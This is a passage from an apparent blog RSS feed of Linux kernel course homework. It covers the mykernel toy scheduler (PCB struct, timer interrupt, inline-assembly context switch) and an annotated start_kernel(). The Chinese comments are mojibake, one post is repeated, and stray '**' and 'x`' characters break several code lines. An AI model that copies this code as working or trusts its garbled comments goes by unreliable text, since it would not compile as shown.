&amp;quot;popl %%ebp\n\t&amp;quot;
:
: &amp;quot;c&amp;quot; (task[pid].thread.ip),&amp;quot;d&amp;quot; (task[pid].thread.sp)
);
}
void my_process(void)
{
int i = 0;
while(1)
{
i++;
if(i%10000000 == 0)
{
printk(KERN_NOTICE &amp;quot;this is process %d -\n&amp;quot;,my_current_task-&amp;gt;pid);
if(my_need_sched == 1)//å¤æ­æ¯å¦è°åº¦ï¼è¯¥å¼å¯æitnerrupt.cä¸­çå½æ°æ¥éç½®
{
my_need_sched = 0;
my_schedule(); //ä¸»å¨è°å¨çæºå¶
}
printk(KERN_NOTICE &amp;quot;this is process %d +\n&amp;quot;,my_current_task-&amp;gt;pid);
}
}
}
&lt;/code>&lt;/pre>
&lt;ol start="3">
&lt;li>myinterrupt.c&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-c">/* linux/mykernel/myinterrupt.c
* Kernel internal my_timer_handler
* Copyright (C) 2013 Mengning
*/
#include &amp;lt;linux/types.h&amp;gt;
#include &amp;lt;linux/string.h&amp;gt;
#include &amp;lt;linux/ctype.h&amp;gt;
#include &amp;lt;linux/tty.h&amp;gt;
#include &amp;lt;linux/vmalloc.h&amp;gt;
#include &amp;quot;mypcb.h&amp;quot;
extern tPCB task[MAX_TASK_NUM];
extern tPCB * my_current_task;
extern volatile int my_need_sched;
volatile int time_count = 0;
/*
* Called by timer interrupt.
* it runs in the name of current running process,
* so it use kernel stack of current running process
*/
void my_timer_handler(void)
{
#if 1
if(time_count%1000 == 0 &amp;amp;&amp;amp; my_need_sched != 1)//æ¶éä¸­æ­1000æ¬¡çæ¶åï¼è°åº¦ä¸æ¬¡, éç½®è°åº¦å¼ä¸º1
{
printk(KERN_NOTICE &amp;quot;&amp;gt;&amp;gt;&amp;gt;my_timer_handler here&amp;lt;&amp;lt;&amp;lt;\n&amp;quot;);
my_need_sched = 1;
}
time_count ++ ;
#endif
return;
}
void my_schedule(void) //è°åº¦å½æ°, æ ¸å¿å½æ°
{
tPCB * next;//å®ä¹ä¸¤ä¸ªæé
tPCB * prev;
if(my_current_task == NULL //å½åè¿ç¨åä¸ä¸è¿ç¨ä¸ºç©º, å³æ²¡æä»»å¡, è¿å
|| my_current_task-&amp;gt;next == NULL)
{
return;
}
printk(KERN_NOTICE &amp;quot;&amp;gt;&amp;gt;&amp;gt;my_schedule&amp;lt;&amp;lt;&amp;lt;\n&amp;quot;);
/* å¨è°åº¦å½æ°ä¸­, nextæåçæ¯ä¸ä¸ä¸ªå°è¦è¢«è°åº¦çä»»å¡, prevæåçæ¯å½åæ­£å¨è¿è¡çä»»å¡*/
/* schedule */
next = my_current_task-&amp;gt;next;//æå½åè¿ç¨çä¸ä¸ä¸ªè¿ç¨èµå¼ç»nextï¼å½åè¿ç¨èµå¼ç»prev
prev = my_current_task;
if(next-&amp;gt;state == 0)/* -1 unrunnable, 0 runnable, &amp;gt;0 stopped */ //å¦æä¸ä¸ä¸ªä»»å¡ä¸æ¯ç¬¬ä¸æ¬¡è¢«è°åº¦, åæ§è¡
{
/* switch to next processââè¿ä¸ªæ¶åä¸ä¸ä¸ªè¿ç¨æè¿ç¨ä¸ä¸æ */
asm volatile(
&amp;quot;pushl %%ebp\n\t&amp;quot; /* save å½åè¿ç¨ ebp */
&amp;quot;movl %%esp,%0\n\t&amp;quot; /* save å½å esp èµå¼å°prev.thread.sp */
&amp;quot;movl %2,%%esp\n\t&amp;quot; /* restore ä¸ä¸ä¸ªè¿ç¨çspå° esp */
&amp;quot;movl $1f,%1\n\t&amp;quot; /* save å½åè¿ç¨ç eip */
&amp;quot;pushl %3\n\t&amp;quot; //ä¿å­ä¸ä¸ä¸ªè¿ç¨eipä¿å­å°æ éé¢
&amp;quot;ret\n\t&amp;quot; /* restore eip */
&amp;quot;1:\t&amp;quot; /* next process start here */
&amp;quot;popl %%ebp\n\t&amp;quot;**
: &amp;quot;=m&amp;quot; (prev-&amp;gt;thread.sp),&amp;quot;=m&amp;quot; (prev-&amp;gt;thread.ip)**
: &amp;quot;m&amp;quot; (next-&amp;gt;thread.sp),&amp;quot;m&amp;quot; (next-&amp;gt;thread.ip)**
);
my_current_task = next;
printk(KERN_NOTICE &amp;quot;&amp;gt;&amp;gt;&amp;gt;switch %d to %d&amp;lt;&amp;lt;&amp;lt;\n&amp;quot;,prev-&amp;gt;pid,next-&amp;gt;pid);
}
else//ä¸ä¸ä¸ªè¿ç¨ä¸ºç¬¬ä¸æ¬¡è¿è¡æ¶,æ²¡æè¿ç¨ä¸ä¸æ, åä»¥ä¸é¢è¿ç§æ¹å¼æ¥å¤ç
{
next-&amp;gt;state = 0;
my_current_task = next;
printk(KERN_NOTICE &amp;quot;&amp;gt;&amp;gt;&amp;gt;switch %d to %d&amp;lt;&amp;lt;&amp;lt;\n&amp;quot;,prev-&amp;gt;pid,next-&amp;gt;pid);
/* switch to new process */
asm volatile(
&amp;quot;pushl %%ebp\n\t&amp;quot; /* save ebp */
&amp;quot;movl %%esp,%0\n\t&amp;quot; /* save esp */x`
&amp;quot;movl %2,%%esp\n\t&amp;quot; /* restore esp */
&amp;quot;movl %2,%%ebp\n\t&amp;quot; /* restore ebp */
&amp;quot;movl $1f,%1\n\t&amp;quot; /* save eip */
&amp;quot;pushl %3\n\t&amp;quot;**
&amp;quot;ret\n\t&amp;quot; /* restore eip */**
: &amp;quot;=m&amp;quot; (prev-&amp;gt;thread.sp),&amp;quot;=m&amp;quot; (prev-&amp;gt;thread.ip)
: &amp;quot;m&amp;quot; (next-&amp;gt;thread.sp),&amp;quot;m&amp;quot; (next-&amp;gt;thread.ip)
);
}
return;
}
&lt;/code>&lt;/pre>
&lt;p>ä»¥æ°ä»»å¡åæ¢ä¸ºä¾è¿è¡å æ åååæï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-15-Linux-Kernel-analysis-Os-work/2018-09-19-01-15-18.gif" alt="">&lt;/p>
&lt;p>æ§è¡ç»æå¦ä¸å¾æç¤ºï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-15-Linux-Kernel-analysis-Os-work/2018-09-19-01-15-09.png" alt="">&lt;/p></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨2_æä½ç³»ç»æ¯å¦ä½å·¥ä½ç</title><link>http://www.guozet.me/post/Linux-Kernel-analysis-Os-work/</link><pubDate>Sun, 01 Mar 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-Kernel-analysis-Os-work/</guid><description>&lt;p>Linuxåæ ¸è¯¾ç¬¬äºå¨ä½ä¸ãæ¬æå¨äºè¯¾å ä¸­å®éªæ¥¼å®æã&lt;br>
&lt;a href="http://guozet.me/about/" target="_blank" rel="noopener">åå½æ³½&lt;/a> ååä½åè½¬è½½è¯·æ³¨æåºå¤.&lt;br>
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;h1 id="è®¡ç®æºæ¯å¦ä½å·¥ä½çå°ç»">è®¡ç®æºæ¯å¦ä½å·¥ä½çï¼å°ç»ï¼&lt;/h1>
&lt;h2 id="æ¦å¿µ">æ¦å¿µ&lt;/h2>
&lt;p>è®¡ç®æºçå·¥ä½ï¼ä¸è¨ä»¥è½ä¹ï¼æ§è¡ç¨åºçè¿ç¨ï¼ä¹å°±æ¯å­å¨ç¨åºå
&lt;a href="http://baike.baidu.com/view/922446.htm" target="_blank" rel="noopener">ç¨åºæ§å¶&lt;/a>çè¿ç¨ã&lt;/p>
&lt;ul>
&lt;li>å­å¨ç¨åºè®¡ç®æºå·¥ä½æ¨¡åï¼è®¡ç®æºç³»ç»ææåºç¡æ§çé»è¾ç»æ&lt;/li>
&lt;li>å½æ°è°ç¨å æ ï¼é«çº§è¯­è¨å¾ä»¥è¿è¡çåºç¡&lt;/li>
&lt;li>ä¸­æ­ï¼å¤éç¨åºæä½ç³»ç»çåºç¹&lt;/li>
&lt;/ul>
&lt;h2 id="ä»¥ä¾åæ">ä»¥ä¾åæ&lt;/h2>
&lt;p>
&lt;a href="https://github.com/mengning/mykernel" title="mykernel" target="_blank" rel="noopener">ä¸ä¸ªç®åçä¸­æ­çä¾å­&lt;/a>(ç¹å»è¿å¥)&lt;/p>
&lt;h3 id="ç®è¦åæmymaincä¸myinterruptc">ç®è¦åæmymain.cä¸myinterrupt.c&lt;/h3>
&lt;pre>&lt;code class="language-c">void __init my_start_kernel(void) // mymain.cä¸­ä¸»è¦åå®¹
{
int i = 0;
while (1) {
i++;
if (i % 100000 == 0) //æ¯å¾ªç¯åä¸æ¬¡æå°ä¸æ¬¡my_start_kernel here
printk(KERN_NOTICE &amp;quot;my_start_kernel here %d \n&amp;quot;, i);
}
}
void my_timer_handler(void) //æ¯æ¬¡æ¶éä¸­æ­è°ç¨ä¸æ¬¡ myinterrupt.cä¸­ä¸»è¦åå®¹
{
printk(KERN_NOTICE
&amp;quot;\n&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;my_timer_handler here&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;\n\n&amp;quot;);
}
&lt;/code>&lt;/pre>
&lt;p>å¯è§ï¼è¿åªæ¯ä¸ä¸ªå¾ç®åçæ¶éä¸­æ­æ¼ç¤ºå®éªï¼æ§è¡ç»æå¦ä¸æç¤ºï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-15-Linux-Kernel-analysis-Os-work/2018-09-19-01-12-35.png" alt="">&lt;/p>
&lt;p>å¯ä»¥æ¸æ¥ççå°ï¼æ¶éæ¯è®°æ°å°åä¸çæ¶åï¼æå°ä¸ä¸ªmy_start_kernel hereï¼æ¶éä¸­æ­çæ¶åæ§è¡my_time_hander here.&lt;/p>
&lt;h3 id="å¨ç¬¬ä¸ä¸ªçåºç¡ä¸è¿è¡æ¶é´çè½®è½¬å¤éç¨åºçå°os">å¨ç¬¬ä¸ä¸ªçåºç¡ä¸è¿è¡æ¶é´çè½®è½¬å¤éç¨åºçå°os.&lt;/h3>
&lt;p>&lt;strong>ä¸»è¦å¯¹mypcb.h, mymain.c åmyinterrupt.cè¿ä¸ä¸ªæä»¶è¿è¡åæ&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>mypcb.h&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-c">/ * linux/mykernel/**mypcb.h**
* Kernel internal PCB types
* Copyright (C) 2013 Mengning
*/
#define MAX_TASK_NUM 4
#define KERNEL_STACK_SIZE 1024*8
/* CPU-specific state of this task */
struct Thread {//ç»ä»»å¡å®ä¹ä¸ä¸ªeipåesp
unsigned longip;
unsigned longsp;
};
typedef struct PCB{
int pid;//ä»»å¡ç¼å·
volatile long state;/* -1 unrunnable, 0 runnable, &amp;gt;0 stopped */
char stack[KERNEL_STACK_SIZE]; //å®ä¹æ ç©ºé´
/* CPU-specific state of this task */
struct Thread thread; //å®ä¹è¿ç¨çç»æä½thread, å¶ä¸­æeipåesp
unsigned longtask_entry;//ä»»å¡çå½æ°èµ·å§å¤, ä¹å°±æ¯ä»»å¡ç¬¬ä¸æ¬¡æ§è¡çèµ·å§ä½ç½®
struct PCB *next;//ä¸ä¸ªä»»å¡é¾è¡¨, æåä¸ä¸ä¸ªä»»å¡
}tPCB;
void my_schedule(void);//ä»»å¡è°å¨å½æ°**
&lt;/code>&lt;/pre>
&lt;ol start="2">
&lt;li>mymain.c&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-c">/* linux/mykernel/mymain.c
* Kernel internal my_start_kernel
* Copyright (C) 2013 Mengning
*/
#include &amp;lt;linux/types.h&amp;gt;
#include &amp;lt;linux/string.h&amp;gt;
#include &amp;lt;linux/ctype.h&amp;gt;
#include &amp;lt;linux/tty.h&amp;gt;
#include &amp;lt;linux/vmalloc.h&amp;gt;
#include &amp;quot;mypcb.h&amp;quot; //å¼å¥å¶ä¸­ä¸¤ä¸ªç»æä½è¡¨ç¤º**
tPCB task[MAX_TASK_NUM];//å®ä¹ä¸¤ä¸ªæ°ç»
tPCB * my_current_task = NULL;
volatile int my_need_sched = 0;//å®ä¹æ¯å¦è°åº¦, 1åè°åº¦, 0åä¸è°åº¦
void my_process(void);
void __init my_start_kernel(void) **//èµ·å§å½æ°ä½ç½®**
{
int pid = 0;
int i;
/* Initialize process 0*/
task[pid].pid = pid;
task[pid].state = 0;/* -1 unrunnable, 0 runnable, &amp;gt;0 stopped */
task[pid].task_entry = task[pid].thread.ip = (unsigned long)my_process;
task[pid].thread.sp = (unsigned long)&amp;amp;task[pid].stack[KERNEL_STACK_SIZE-1]; //0å·è¿ç¨æ å¨æå¼å§çä½ç½®**
task[pid].next = &amp;amp;task[pid];//ä¸ä¸ä¸ªä»»å¡ä¹æ¯èªå·±ï¼å¨è¿éï¼å¶ä»ä»»å¡è¿æ²¡æåå»º
/*fork more process *///åå»ºå¤ä¸ªä»»å¡
for(i=1;i&amp;lt;MAX_TASK_NUM;i++)
{
memcpy(&amp;amp;task[i],&amp;amp;task[0],sizeof(tPCB));//å¤å¶0å·è¿ç¨çç»æå½¢å¼
task[i].pid = i;
task[i].state = -1;//åå§çä»»å¡(é¤0å·è¿ç¨å¤)é½è®¾ç½®ææªè¿è¡
task[i].thread.sp = (unsigned long)&amp;amp;task[i].stack[KERNEL_STACK_SIZE-1];
task[i].next = task[i-1].next;//æ°forkçè¿ç¨å å°è¿ç¨é¾è¡¨çå°¾é¨, è¯¥æ°å»ºä»»å¡çnextæåä¸ä¸ä¸ªä»»å¡çnext,ä¹å°±æ¯èªå·±ï¼æåä¸ä¸ªï¼
task[i-1].next = &amp;amp;task[i]; //éç½®ä¸ä¸ä¸ªä»»å¡çnextæåè¿æ¶åæ°åå»ºçä»»å¡
}
/* start process 0 by task[0] */
pid = 0;
my_current_task = &amp;amp;task[pid];//åè®©0å·è¿ç¨åæ§è¡
asm volatile(
&amp;quot;movl %1,%%esp\n\t&amp;quot; /* set task[pid].thread.sp to esp */
&amp;quot;pushl %1\n\t&amp;quot; /* push ebp ,å½åesp=ebp*/
&amp;quot;pushl %0\n\t&amp;quot; /* push task[pid].thread.ip */
&amp;quot;ret\n\t&amp;quot; /* pop task[pid].thread.ip to eip */
&amp;quot;popl %%ebp\n\t&amp;quot;
:
: &amp;quot;c&amp;quot; (task[pid].thread.ip),&amp;quot;d&amp;quot; (task[pid].thread.sp)
);
}
void my_process(void)
{
int i = 0;
while(1)
{
i++;
if(i%10000000 == 0)
{
printk(KERN_NOTICE &amp;quot;this is process %d -\n&amp;quot;,my_current_task-&amp;gt;pid);
if(my_need_sched == 1)//å¤æ­æ¯å¦è°åº¦ï¼è¯¥å¼å¯æitnerrupt.cä¸­çå½æ°æ¥éç½®
{
my_need_sched = 0;
my_schedule(); //ä¸»å¨è°å¨çæºå¶
}
printk(KERN_NOTICE &amp;quot;this is process %d +\n&amp;quot;,my_current_task-&amp;gt;pid);
}
}
}
&lt;/code>&lt;/pre>
&lt;ol start="3">
&lt;li>myinterrupt.c&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-c">/* linux/mykernel/myinterrupt.c
* Kernel internal my_timer_handler
* Copyright (C) 2013 Mengning
*/
#include &amp;lt;linux/types.h&amp;gt;
#include &amp;lt;linux/string.h&amp;gt;
#include &amp;lt;linux/ctype.h&amp;gt;
#include &amp;lt;linux/tty.h&amp;gt;
#include &amp;lt;linux/vmalloc.h&amp;gt;
#include &amp;quot;mypcb.h&amp;quot;
extern tPCB task[MAX_TASK_NUM];
extern tPCB * my_current_task;
extern volatile int my_need_sched;
volatile int time_count = 0;
/*
* Called by timer interrupt.
* it runs in the name of current running process,
* so it use kernel stack of current running process
*/
void my_timer_handler(void)
{
#if 1
if(time_count%1000 == 0 &amp;amp;&amp;amp; my_need_sched != 1)//æ¶éä¸­æ­1000æ¬¡çæ¶åï¼è°åº¦ä¸æ¬¡, éç½®è°åº¦å¼ä¸º1
{
printk(KERN_NOTICE &amp;quot;&amp;gt;&amp;gt;&amp;gt;my_timer_handler here&amp;lt;&amp;lt;&amp;lt;\n&amp;quot;);
my_need_sched = 1;
}
time_count ++ ;
#endif
return;
}
void my_schedule(void) //è°åº¦å½æ°, æ ¸å¿å½æ°
{
tPCB * next;//å®ä¹ä¸¤ä¸ªæé
tPCB * prev;
if(my_current_task == NULL //å½åè¿ç¨åä¸ä¸è¿ç¨ä¸ºç©º, å³æ²¡æä»»å¡, è¿å
|| my_current_task-&amp;gt;next == NULL)
{
return;
}
printk(KERN_NOTICE &amp;quot;&amp;gt;&amp;gt;&amp;gt;my_schedule&amp;lt;&amp;lt;&amp;lt;\n&amp;quot;);
/* å¨è°åº¦å½æ°ä¸­, nextæåçæ¯ä¸ä¸ä¸ªå°è¦è¢«è°åº¦çä»»å¡, prevæåçæ¯å½åæ­£å¨è¿è¡çä»»å¡*/
/* schedule */
next = my_current_task-&amp;gt;next;//æå½åè¿ç¨çä¸ä¸ä¸ªè¿ç¨èµå¼ç»nextï¼å½åè¿ç¨èµå¼ç»prev
prev = my_current_task;
if(next-&amp;gt;state == 0)/* -1 unrunnable, 0 runnable, &amp;gt;0 stopped */ //å¦æä¸ä¸ä¸ªä»»å¡ä¸æ¯ç¬¬ä¸æ¬¡è¢«è°åº¦, åæ§è¡
{
/* switch to next processââè¿ä¸ªæ¶åä¸ä¸ä¸ªè¿ç¨æè¿ç¨ä¸ä¸æ */
asm volatile(
&amp;quot;pushl %%ebp\n\t&amp;quot; /* save å½åè¿ç¨ ebp */
&amp;quot;movl %%esp,%0\n\t&amp;quot; /* save å½å esp èµå¼å°prev.thread.sp */
&amp;quot;movl %2,%%esp\n\t&amp;quot; /* restore ä¸ä¸ä¸ªè¿ç¨çspå° esp */
&amp;quot;movl $1f,%1\n\t&amp;quot; /* save å½åè¿ç¨ç eip */
&amp;quot;pushl %3\n\t&amp;quot; //ä¿å­ä¸ä¸ä¸ªè¿ç¨eipä¿å­å°æ éé¢
&amp;quot;ret\n\t&amp;quot; /* restore eip */
&amp;quot;1:\t&amp;quot; /* next process start here */
&amp;quot;popl %%ebp\n\t&amp;quot;**
: &amp;quot;=m&amp;quot; (prev-&amp;gt;thread.sp),&amp;quot;=m&amp;quot; (prev-&amp;gt;thread.ip)**
: &amp;quot;m&amp;quot; (next-&amp;gt;thread.sp),&amp;quot;m&amp;quot; (next-&amp;gt;thread.ip)**
);
my_current_task = next;
printk(KERN_NOTICE &amp;quot;&amp;gt;&amp;gt;&amp;gt;switch %d to %d&amp;lt;&amp;lt;&amp;lt;\n&amp;quot;,prev-&amp;gt;pid,next-&amp;gt;pid);
}
else//ä¸ä¸ä¸ªè¿ç¨ä¸ºç¬¬ä¸æ¬¡è¿è¡æ¶,æ²¡æè¿ç¨ä¸ä¸æ, åä»¥ä¸é¢è¿ç§æ¹å¼æ¥å¤ç
{
next-&amp;gt;state = 0;
my_current_task = next;
printk(KERN_NOTICE &amp;quot;&amp;gt;&amp;gt;&amp;gt;switch %d to %d&amp;lt;&amp;lt;&amp;lt;\n&amp;quot;,prev-&amp;gt;pid,next-&amp;gt;pid);
/* switch to new process */
asm volatile(
&amp;quot;pushl %%ebp\n\t&amp;quot; /* save ebp */
&amp;quot;movl %%esp,%0\n\t&amp;quot; /* save esp */x`
&amp;quot;movl %2,%%esp\n\t&amp;quot; /* restore esp */
&amp;quot;movl %2,%%ebp\n\t&amp;quot; /* restore ebp */
&amp;quot;movl $1f,%1\n\t&amp;quot; /* save eip */
&amp;quot;pushl %3\n\t&amp;quot;**
&amp;quot;ret\n\t&amp;quot; /* restore eip */**
: &amp;quot;=m&amp;quot; (prev-&amp;gt;thread.sp),&amp;quot;=m&amp;quot; (prev-&amp;gt;thread.ip)
: &amp;quot;m&amp;quot; (next-&amp;gt;thread.sp),&amp;quot;m&amp;quot; (next-&amp;gt;thread.ip)
);
}
return;
}
&lt;/code>&lt;/pre>
&lt;p>ä»¥æ°ä»»å¡åæ¢ä¸ºä¾è¿è¡å æ åååæï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-15-Linux-Kernel-analysis-Os-work/2018-09-19-01-15-18.gif" alt="">&lt;/p>
&lt;p>æ§è¡ç»æå¦ä¸å¾æç¤ºï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-15-Linux-Kernel-analysis-Os-work/2018-09-19-01-15-09.png" alt="">&lt;/p></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨3_start_kernel()å½æ°åæ</title><link>http://www.guozet.me/post/Linux-Kernel-analysis-Start-Kernel-Function/</link><pubDate>Sun, 01 Mar 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-Kernel-analysis-Start-Kernel-Function/</guid><description>&lt;p>Linuxåæ ¸è¯¾ç¬¬ä¸å¨ä½ä¸ãæ¬æå¨äºè¯¾å ä¸­å®éªæ¥¼å®æã&lt;br>
&lt;a href="http://guozet.me/about/" target="_blank" rel="noopener">åå½æ³½&lt;/a> ååä½åè½¬è½½è¯·æ³¨æåºå¤.&lt;br>
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;h1 id="åæstart_kernelå½æ°">åæStart_kernelå½æ°&lt;/h1>
&lt;p>æä½¿ç¨çæ¯linux-2.6.14çæºä»£ç æ¥åæçãå¨è¿éçªåºéç¹ï¼ä¸»è¦æ¥åæstart_kernelè¿ä¸ªå½æ°ä¸­çå¤§è´å®ç°ãå¼æºå¯å¨å°start_kernelè¿ä¸ªè¿ç¨ä¸»è¦æ¯æ±ç¼æ¥å®ç°çï¼å·ä½å¯åè&lt;/p>
&lt;ul>
&lt;li>
&lt;a href="https://blog.csdn.net/aaronychen/article/details/2838341" target="_blank" rel="noopener">linux kernel ä»å¥å£å°start_kernel çä»£ç åæ&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>start_kernel()è¿ä¸ªå½æ°æ¯åæ ¸ç±å¼å¯¼ç¨åºå¼å¯¼ä»¥åï¼ç±èªè§£åç¨åºè§£åä»¥åæ§è¡çç¬¬ä¸ä¸ªå½æ°ï¼å¯ä»¥è®¤ä¸ºæ¯æ´ä¸ªåæ ¸çå¥å£å½æ°ï¼start_kernel()åçå·¥ä½å°±æ¯çº¿æ§çåå§åä¸äºåæ ¸çåºç¡æºå¶ï¼å¦ä¸­æ­ï¼åå­ç®¡çï¼è¿ç¨ç®¡çï¼ä¿¡å·ï¼æä»¶ç³»ç»ï¼KOç­ï¼æåå°±å¯å¨ä¸ä¸ªinitçº¿ç¨ï¼initçº¿ç¨åè¯»åæä»¶ç³»ç»éçinitç¨åºï¼åä¸ºç³»ç»çç¬¬ä¸ä¸ªè¿ç¨èå­å¨ï¼&lt;/p>
&lt;p>start_kernelæºç å¦ä¸ï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">&amp;lt;span style=&amp;quot;font-size:14px;&amp;quot;&amp;gt;asmlinkage void __init start_kernel(void)
{
char * command_line; //å½ä»¤è¡ï¼ç¨æ¥å­æ¾bootloaderä¼ éè¿æ¥çåæ°
extern struct kernel_param __start___param[], __stop___param[];&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;&amp;quot;&amp;gt;//è¿ä¸¤ä¸ªåéä¸ºå°åæéï¼æååæ ¸å¯å¨åæ°å¤çç¸å³ç»æä½å¨åå­çä½ç½®ï¼ &amp;lt;/span&amp;gt;
lock_kernel();&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;&amp;quot;&amp;gt;//å»ºç«ä¸ä¸ªåå¸è¡¨(hash tables)ï¼å°±æ¯ä¸ä¸ªååæåçæéç»æä½æ°ç»ã&amp;lt;/span&amp;gt;&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;&amp;quot;&amp;gt;ãå½æ°çä¸»è¦ä½ç¨æ¯åå§åéçç¶æè·è¸ªæ¨¡åãç±äºåæ ¸å¤§éä½¿ç¨éæ¥è¿è¡å¤è¿ç¨å¤å¤çå¨çåæ­¥æä½ï¼æ­»éå°±ä¼å¨ä»£ç ä¸åççæ¶ååºç°ï¼ä½æ¯è¦å®ä½åªä¸ªéæ¯è¾å°é¾ï¼ç¨åå¸è¡¨å¯ä»¥è·è¸ªéçä½¿ç¨ç¶æãæ­»éæåµï¼ä¸ä¸ªè¿ç¨éå½å éåä¸æéï¼åä¸æéå¨ä¸¤æ¬¡ä¸­æ­ä¸­å éï¼å æéå½¢æé­ç¯æ­»éã&amp;lt;/span&amp;gt;
page_address_init(); //åå§åé«ç«¯åå­çæ å°è¡¨
printk(KERN_NOTICE); //æå°ä¿¡æ¯
printk(linux_banner); //æå°Linuxççæ¬ä¿¡æ¯
setup_arch(&amp;amp;command_line); &amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;&amp;quot;&amp;gt;//åæ ¸æ¶æç¸å³åå§åå½æ°ï¼æ¯éå¸¸éè¦çä¸ä¸ªåå§åæ­¥éª¤ãå¶ä¸­åå«äºå¤çå¨ç¸å³åæ°çåå§åãåæ ¸å¯å¨åæ°(tagged list)çè·åååæå¤çãåå­å­ç³»ç»çæ©æåå§å(bootmemåéå¨)&amp;lt;/span&amp;gt;
&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;&amp;quot;&amp;gt; setup_per_cpu_areas();&amp;lt;/span&amp;gt;
smp_prepare_boot_cpu();//ä¸ºSMPç³»ç»éå¼å¯¼CPU(boot-cpu)è¿è¡åå¤å·¥ä½ãå¨ARMç³»ç»åæ ¸éæ¯ç©ºå½æ°
sched_init();&amp;lt;span style=&amp;quot;white-space:pre&amp;quot;&amp;gt; &amp;lt;/span&amp;gt;//å¯¹è¿ç¨è°åº¦å¨çæ°æ®ç»æè¿è¡åå§åï¼åå»ºè¿è¡éåï¼è®¾ç½®å½åä»»å¡çç©ºçº¿ç¨ï¼å½åä»»å¡çè°åº¦ç­ç¥ä¸ºCFSè°åº¦å¨
preempt_disable(); //å³é­ä¼åçº§è°åº¦ãç±äºæ¯ä¸ªè¿ç¨ä»»å¡é½æä¼åçº§ï¼ç®åç³»ç»è¿æ²¡æå®å¨åå§åï¼è¿ä¸è½æå¼ä¼åçº§è°åº¦ã
build_all_zonelists();
page_alloc_init(); //è®¾ç½®åå­é¡µåééç¥å¨
printk(KERN_NOTICE &amp;quot;Kernel command line: %s\n&amp;quot;, saved_command_line); //è¾åºå½ä»¤åæ°å°æ¾ç¤ºç»ç«¯
parse_early_param(); //è§£æcmdlineä¸­çå¯å¨åæ°
parse_args(&amp;quot;Booting kernel&amp;quot;, command_line, __start___param,
__stop___param - __start___param,
&amp;amp;unknown_bootoption);
//è¿è¡ä»£ç ä¸»è¦å¯¹ä¼ å¥åæ ¸åæ°è¿è¡è§£éï¼å¦æä¸è½è¯å«çå½ä»¤å°±è°ç¨æååæ°çå½æ°
sort_main_extable();//å¯¹åæ ¸å¼å¸¸è¡¨(exception table)æç§å¼å¸¸åéå·å¤§å°è¿è¡æåºï¼ä»¥ä¾¿å éè®¿é®
trap_init(); //å¯¹åæ ¸é·é±å¼å¸¸è¿è¡åå§åï¼åå§åä¸äºä¸­æ­åéï¼å¨ARMç³»ç»éæ¯ç©ºå½æ°ï¼æ²¡æä»»ä½çåå§å
rcu_init(); //åå§åç´æ¥è¯»æ·è´æ´æ°çéæºå¶ã Read-Copy Update ãRCUä¸»è¦æä¾å¨è¯»åæ°æ®æºä¼æ¯è¾å¤ï¼ä½æ´æ°æ¯è¾çå°çåºåï¼è¿æ ·åå°è¯»åæ°æ®éçæ§è½ä½ä¸çé®é¢ãã
init_IRQ();&amp;lt;span style=&amp;quot;white-space:pre&amp;quot;&amp;gt; &amp;lt;/span&amp;gt;//å¯¹åºæ¶æç¹å®çä¸­æ­åå§åå½æ°ï¼å¨ARMä¸­å°±æ¯machine_desc-&amp;gt;init_irq()ï¼å°±æ¯è¿è¡è®¾å¤æè¿°ç»æä½ä¸­çinit_irqå½æ°[arch/arm/mach-msm/board-xxx.c]
pidhash_init();
init_timers();&amp;lt;span style=&amp;quot;white-space:pre&amp;quot;&amp;gt; &amp;lt;/span&amp;gt;
//åå§åå¼å¯¼CPUçæ¶éç¸å³çæ°æ®ç»æï¼æ³¨åæ¶éçåè°å½æ°ï¼å½æ¶éå°è¾¾æ¶å¯ä»¥åè°æ¶éå¤çå½æ°ï¼æååå§åæ¶éè½¯ä»¶ä¸­æ­å¤ç
//åå§åå®æ¶å¨,å¼å¯å®æ¶å¨è½¯ä¸­æ­æå¡ä»¥åæ³¨åæå¡ç¨åºä»¥ååå§ååCPUä¸­çtev_baseç­init_timers()-&amp;gt;run_timer_softirq()-&amp;gt;__run_timers()..
softirq_init();
